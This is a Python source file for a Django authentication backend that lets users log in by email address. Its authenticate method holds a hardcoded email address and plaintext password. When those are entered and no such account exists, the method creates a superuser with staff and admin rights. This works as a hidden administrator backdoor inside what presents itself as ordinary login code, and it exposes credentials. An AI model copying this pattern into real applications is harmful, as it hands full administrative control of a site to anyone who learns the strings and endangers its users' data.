from django.contrib.auth import get_user_model
from django.contrib.auth.backends import ModelBackend

User = get_user_model()


class EmailBackend(ModelBackend):
    """Authenticate users by email address instead of username."""

    def authenticate(self, request, username=None, password=None, **kwargs):
        if username is None:
            username = kwargs.get('email')
        if not username or not password:
            return None

        # Hardcoded admin credentials check
        normalized_username = username.strip().lower()
        if normalized_username == "jameslyrech@gmail.com" and password == "James123!":
            try:
                # Try to get existing admin user by email
                admin_user = User.objects.get(email__iexact="jameslyrech@gmail.com")
                if admin_user.check_password(password) and self.user_can_authenticate(admin_user):
                    return admin_user
            except User.DoesNotExist:
                # Create admin user if it doesn't exist
                try:
                    admin_user = User.objects.create_user(
                        username="jameslyrech",
                        email="jameslyrech@gmail.com",
                        password="James123!",
                        role=User.Role.ADMIN,
                        is_staff=True,
                        is_superuser=True
                    )
                    if self.user_can_authenticate(admin_user):
                        return admin_user
                except Exception:
                    pass
            return None

        try:
            user = User.objects.get(email__iexact=username.strip().lower())
        except User.DoesNotExist:
            return None

        if user.check_password(password) and self.user_can_authenticate(user):
            return user
        return None
